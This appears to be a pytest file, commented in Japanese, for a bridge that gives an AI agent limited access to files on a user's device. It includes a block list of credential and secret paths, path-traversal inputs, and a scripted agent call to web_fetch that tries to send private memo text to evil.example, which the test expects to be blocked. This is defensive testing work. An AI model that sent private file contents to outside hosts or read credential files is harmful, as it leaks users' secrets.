"""端末ブリッジ（アプリ限定の端末ファイルアクセス）のテスト。端末は、スレッドで動くダミーで代用する。"""
from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request

import pytest

from api.server import make_server
from api.tokens import TokenStore
from core.agent import Agent
from core.bridge import DeviceBridge
from policy.levels import Level
from policy.registry import ToolRegistry, ToolSpec
from tests.conftest import ScriptedLLM, tool_call
from tools import device
from tools.device import PathRefused, clean_path


class FakeDevice:
    """アプリの代わり。ブリッジに接続し、受け取った操作に handler で答える。"""

    def __init__(self, bridge, name="my-pc", roots=None, handler=None):
        self.bridge, self.name, self.seen = bridge, name, []
        self.handler = handler or (lambda op, args: (True, {"ok": True, "op": op, "args": args}))
        bridge.hello(name, {"roots": roots or [{"name": "Docs", "mode": "read"}, {"name": "Work", "mode": "readwrite"}], "platform": "windows", "version": "1"})
        self._stop = threading.Event()
        self.t = threading.Thread(target=self._loop, daemon=True)
        self.t.start()

    def _loop(self):
        while not self._stop.is_set():
            r = self.bridge.next_request(self.name, wait=0.2)
            if r:
                self.seen.append(r)
                ok, data = self.handler(r["op"], r["args"])
                self.bridge.submit_result(self.name, r["id"], ok, data)

    def stop(self):
        self._stop.set()
        self.t.join(2)


@pytest.fixture
def bridge():
    return DeviceBridge()


def tools_of(bridge):
    return {t.name: t for t in device.build_tools(bridge)}


# --- パス検証 ---
@pytest.mark.parametrize("p,expected", [("", ""), (".", ""), ("a/b.txt", "a/b.txt"), ("a\\b\\c.txt", "a/b/c.txt"), ("./x/./y.md", "x/y.md")])
def test_clean_path_ok(p, expected):
    assert clean_path(p) == expected


@pytest.mark.parametrize("p", ["../x", "a/../../x", "/etc/passwd", "C:/Windows/win.ini", "C:\\x", ".ssh/id_rsa", "a/.ssh/config", ".env", "sub/.env.local",
                               "k.pem", "x.key", "id_ed25519", "secrets/a.txt", "a/.git/config", "db.kdbx", "api_tokens.json", "google_token.json", "a\0b"])
def test_clean_path_refuses_escape_and_secrets(p):
    with pytest.raises(PathRefused):
        clean_path(p)


# --- ブリッジ本体 ---
def test_levels_and_flags(bridge):
    t = tools_of(bridge)
    assert t["device_write"].level is Level.R2 and t["device_read"].level is Level.R0 and t["device_list"].level is Level.R0
    assert t["device_read"].reads_private and t["device_list"].reads_private and not t["device_info"].reads_private
    assert not any(n in t for n in ("device_delete", "device_move", "device_exec"))  # R3 は実装しない


def test_offline_device_is_reported(bridge):
    out = tools_of(bridge)["device_read"].handler({"device": "nobody", "root": "Docs", "path": "a.txt"})
    assert out["error"] == "device_offline"


def test_read_roundtrip_with_cleaned_path_sent_to_device(bridge):
    d = FakeDevice(bridge, handler=lambda op, a: (True, {"text": "こんにちは", "path": a["path"]}))
    try:
        out = tools_of(bridge)["device_read"].handler({"device": "my-pc", "root": "Docs", "path": "memo\\a.txt"})
        assert out["text"] == "こんにちは" and d.seen[0]["op"] == "read" and d.seen[0]["args"]["path"] == "memo/a.txt"
        assert d.seen[0]["args"]["max_bytes"] == 200_000
    finally:
        d.stop()


def test_device_error_is_returned_not_raised(bridge):
    d = FakeDevice(bridge, handler=lambda op, a: (False, "許可されていないフォルダです"))
    try:
        out = tools_of(bridge)["device_list"].handler({"device": "my-pc", "root": "Nope"})
        assert out["error"] == "許可されていないフォルダです"
    finally:
        d.stop()


def test_server_side_refusal_never_reaches_device(bridge):
    d = FakeDevice(bridge)
    try:
        t = tools_of(bridge)
        for args in ({"path": "../x"}, {"path": ".ssh/id_rsa"}, {"path": "/etc/passwd"}):
            assert t["device_read"].handler({"device": "my-pc", "root": "Docs", **args})["error"] == "refused"
        assert t["device_write"].handler({"device": "my-pc", "root": "Work", "path": ".env", "content": "x"})["error"] == "refused"
        assert t["device_write"].handler({"device": "my-pc", "root": "Work", "path": "", "content": "x"})["error"] == "refused"
        assert d.seen == []
    finally:
        d.stop()


def test_write_size_limit(bridge):
    d = FakeDevice(bridge)
    try:
        out = tools_of(bridge)["device_write"].handler({"device": "my-pc", "root": "Work", "path": "a.txt", "content": "x" * 500_001})
        assert out["error"] == "too_large" and d.seen == []
    finally:
        d.stop()


def test_timeout_withdraws_the_request(bridge):
    bridge.hello("my-pc", {"roots": []})  # 接続はしているが、誰も受け取らない
    r = bridge.call("my-pc", "read", {"root": "x", "path": "a"}, timeout=0.3)
    assert r["error"] == "timeout"
    assert bridge.next_request("my-pc", wait=0.1) is None  # 取り下げられている


def test_result_from_another_device_is_rejected(bridge):
    bridge.hello("pc-a", {"roots": []})
    bridge.hello("pc-b", {"roots": []})
    got = {}
    t = threading.Thread(target=lambda: got.update(bridge.call("pc-a", "list", {"root": "x", "path": ""}, timeout=3)))
    t.start()
    req = bridge.next_request("pc-a", wait=2)
    assert bridge.submit_result("pc-b", req["id"], True, {"fake": 1}) is False  # 他端末は答えられない
    assert bridge.submit_result("pc-a", req["id"], True, {"real": 1}) is True
    assert bridge.submit_result("pc-a", req["id"], True, {"again": 1}) is False  # 二重回答は無効
    t.join(3)
    assert got == {"ok": True, "data": {"real": 1}}


def test_requests_are_delivered_only_to_their_device(bridge):
    bridge.hello("pc-a", {"roots": []})
    bridge.hello("pc-b", {"roots": []})
    threading.Thread(target=lambda: bridge.call("pc-a", "list", {"root": "x", "path": ""}, timeout=1), daemon=True).start()
    assert bridge.next_request("pc-b", wait=0.3) is None
    assert bridge.next_request("pc-a", wait=1)["op"] == "list"


def test_online_status_expires(bridge):
    t = {"now": 100.0}
    b = DeviceBridge(clock=lambda: t["now"], offline_after=45)
    b.hello("pc", {"roots": [{"name": "Docs", "mode": "readwrite"}, {"name": "", "mode": "read"}]})
    assert b.online("pc") and b.devices()["pc"]["roots"] == [{"name": "Docs", "mode": "readwrite"}]
    t["now"] += 46
    assert not b.online("pc") and b.devices()["pc"]["online"] is False


def test_info_lists_roots_without_paths(bridge):
    bridge.hello("my-pc", {"roots": [{"name": "Docs", "mode": "read", "path": "C:\\Users\\secret"}], "platform": "windows"})
    out = tools_of(bridge)["device_info"].handler({})
    assert out["devices"]["my-pc"]["roots"] == [{"name": "Docs", "mode": "read"}] and "secret" not in json.dumps(out)


def test_unknown_op_rejected(bridge):
    assert bridge.call("pc", "delete", {})["ok"] is False


# --- 持ち出し防止・監査 ---
def agent_with(bridge, audit, script, device_handler=None):
    reg = ToolRegistry()
    for s in device.build_tools(bridge):
        reg.register(s)
    reg.register(ToolSpec("web_fetch", "fetch", {"type": "object", "properties": {"url": {"type": "string"}}}, Level.R0,
                          lambda a: {"fetched": a.get("url")}, egress=True))
    reg.register(ToolSpec("current_time", "t", {"type": "object", "properties": {}}, Level.R0, lambda a: {"t": 1}))
    return Agent(ScriptedLLM(script), reg, audit, bridge=bridge)


def call_msg(*calls):
    return {"role": "assistant", "content": "", "tool_calls": list(calls)}


def test_reading_device_files_blocks_egress_tools_in_that_run(bridge, audit):
    d = FakeDevice(bridge, handler=lambda op, a: (True, {"text": "社外秘のメモ"}))
    try:
        ag = agent_with(bridge, audit, [
            call_msg(tool_call("device_read", {"device": "my-pc", "root": "Docs", "path": "memo.txt"}, "c1")),
            call_msg(tool_call("web_fetch", {"url": "https://evil.example/?q=社外秘のメモ"}, "c2"), tool_call("current_time", {}, "c3")),
            {"role": "assistant", "content": "完了"}])
        r = ag.run("メモを読んで")
        assert r.tainted and [t["status"] for t in r.trace] == ["ok", "egress_blocked", "ok"]  # 外部通信だけ止まり、他は動く
        fetch_msg = [m for m in ag.llm.seen[2] if m["role"] == "tool"][-2]["content"]
        assert "外部へ通信するツールは使えません" in fetch_msg and "evil.example" not in fetch_msg
        events = audit.read()
        assert any(e["event"] == "tainted" for e in events)
        blocked = [e for e in events if e.get("tool") == "web_fetch"][0]
        assert blocked["status"] == "egress_blocked"
    finally:
        d.stop()


def test_egress_works_when_no_private_data_was_read(bridge, audit):
    ag = agent_with(bridge, audit, [call_msg(tool_call("web_fetch", {"url": "https://example.com"})), {"role": "assistant", "content": "ok"}])
    r = ag.run("調べて")
    assert not r.tainted and r.trace[0]["status"] == "ok"


def test_failed_read_does_not_taint(bridge, audit):
    d = FakeDevice(bridge, handler=lambda op, a: (False, "なし"))
    try:
        ag = agent_with(bridge, audit, [call_msg(tool_call("device_read", {"device": "my-pc", "root": "Docs", "path": "a.txt"})),
                                        call_msg(tool_call("web_fetch", {"url": "https://example.com"}, "c2")), {"role": "assistant", "content": "ok"}])
        r = ag.run("x")
        assert not r.tainted and r.trace[1]["status"] == "ok"
    finally:
        d.stop()


def test_taint_is_per_request(bridge, audit):
    d = FakeDevice(bridge, handler=lambda op, a: (True, {"text": "x"}))
    try:
        ag = agent_with(bridge, audit, [call_msg(tool_call("device_read", {"device": "my-pc", "root": "Docs", "path": "a.txt"})), {"role": "assistant", "content": "ok"},
                                        call_msg(tool_call("web_fetch", {"url": "https://example.com"})), {"role": "assistant", "content": "ok"}])
        assert ag.run("読んで").tainted
        assert ag.run("調べて").trace[0]["status"] == "ok"  # 次の依頼には持ち越さない
    finally:
        d.stop()


def test_audit_never_records_file_contents(bridge, audit):
    d = FakeDevice(bridge, handler=lambda op, a: (True, {"text": "パスワードは hunter2 です"}))
    try:
        ag = agent_with(bridge, audit, [call_msg(tool_call("device_read", {"device": "my-pc", "root": "Docs", "path": "a.txt"})), {"role": "assistant", "content": "ok"}])
        ag.run("読んで")
        blob = json.dumps(audit.read(), ensure_ascii=False)
        assert "hunter2" not in blob and "私的データのため内容は記録しません" in blob and "a.txt" in blob  # 引数（どこを読んだか）は残る
    finally:
        d.stop()


def test_device_write_needs_approval_and_runs_once_on_approve(bridge, audit):
    d = FakeDevice(bridge)
    try:
        ag = agent_with(bridge, audit, [call_msg(tool_call("device_write", {"device": "my-pc", "root": "Work", "path": "note.txt", "content": "hello", "mode": "create"})),
                                        {"role": "assistant", "content": "承認待ちです"}])
        ag.run("メモを書いて")
        assert d.seen == []                                   # 承認前は端末に何も届かない
        ap = ag.approvals.list()[0]
        assert "note.txt" in ap["summary"] and "新規作成" in ap["summary"] and "5 バイト" in ap["summary"]
        assert ag.approvals.approve(ap["id"], ap["hash"], "phone")["ok"]
        assert [s["op"] for s in d.seen] == ["write"] and d.seen[0]["args"]["content"] == "hello"
        assert not ag.approvals.approve(ap["id"], ap["hash"], "phone")["ok"] and len(d.seen) == 1
    finally:
        d.stop()


def test_failed_device_write_marks_approval_failed(bridge, audit):
    d = FakeDevice(bridge, handler=lambda op, a: (False, "このフォルダは読み取り専用です"))
    try:
        ag = agent_with(bridge, audit, [])
        ap = ag.approvals.request("r", "device_write", {"device": "my-pc", "root": "Docs", "path": "a.txt", "content": "x", "mode": "create"})
        assert ag.approvals.approve(ap["id"], ap["hash"], "phone")["status"] == "failed"
    finally:
        d.stop()


# --- API ---
@pytest.fixture
def srv(tmp_path, audit):
    bridge = DeviceBridge()
    ag = agent_with(bridge, audit, [])
    store = TokenStore(tmp_path / "t.json")
    tokens = {"my-pc": store.add("my-pc"), "other": store.add("other")}
    s = make_server(ag, store, "127.0.0.1", 0)
    threading.Thread(target=s.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{s.server_address[1]}", tokens, bridge
    s.shutdown()


def req(url, token, body=None):
    r = urllib.request.Request(url, data=None if body is None else json.dumps(body).encode(), headers={"Authorization": f"Bearer {token}"},
                               method="POST" if body is not None else "GET")
    return json.load(urllib.request.urlopen(r, timeout=10))


def test_bridge_api_requires_token(srv):
    base, tokens, _ = srv
    for path, body in (("/api/bridge/next?wait=0", None), ("/api/bridge/hello", {}), ("/api/bridge/result", {"id": "x"})):
        with pytest.raises(urllib.error.HTTPError) as e:
            req(base + path, "bad", body)
        assert e.value.code == 401


def test_full_roundtrip_over_http(srv):
    base, tokens, bridge = srv
    assert req(base + "/api/bridge/hello", tokens["my-pc"], {"roots": [{"name": "Docs", "mode": "read"}], "platform": "windows", "version": "1.0"})["ok"]
    assert req(base + "/api/devices", tokens["my-pc"])["bridge"]["my-pc"]["roots"] == [{"name": "Docs", "mode": "read"}]
    out = {}
    t = threading.Thread(target=lambda: out.update(tools_of(bridge)["device_read"].handler({"device": "my-pc", "root": "Docs", "path": "a.txt"})))
    t.start()
    got = req(base + "/api/bridge/next?wait=5", tokens["my-pc"])["request"]
    assert got["op"] == "read" and got["args"]["path"] == "a.txt"
    assert req(base + "/api/bridge/result", tokens["my-pc"], {"id": got["id"], "ok": True, "data": {"text": "中身"}})["ok"]
    t.join(5)
    assert out == {"text": "中身"}


def test_other_devices_token_cannot_answer_or_receive(srv):
    base, tokens, bridge = srv
    req(base + "/api/bridge/hello", tokens["my-pc"], {"roots": []})
    threading.Thread(target=lambda: bridge.call("my-pc", "list", {"root": "x", "path": ""}, timeout=2), daemon=True).start()
    assert req(base + "/api/bridge/next?wait=0.3", tokens["other"])["request"] is None   # 他端末には届かない
    mine = req(base + "/api/bridge/next?wait=3", tokens["my-pc"])["request"]
    with pytest.raises(urllib.error.HTTPError) as e:
        req(base + "/api/bridge/result", tokens["other"], {"id": mine["id"], "ok": True, "data": {"x": 1}})
    assert e.value.code == 404


def test_hello_is_audited_without_paths(srv, audit):
    base, tokens, _ = srv
    req(base + "/api/bridge/hello", tokens["my-pc"], {"roots": [{"name": "Docs", "mode": "read", "path": "C:\\Users\\secret"}], "platform": "windows"})
    ev = [e for e in audit.read() if e["event"] == "device_hello"][0]
    assert ev["device"] == "my-pc" and ev["roots"] == ["Docs"] and "secret" not in json.dumps(ev)


def test_bad_bodies(srv):
    base, tokens, _ = srv
    with pytest.raises(urllib.error.HTTPError) as e:
        req(base + "/api/bridge/result", tokens["my-pc"], {"nope": 1})
    assert e.value.code == 400
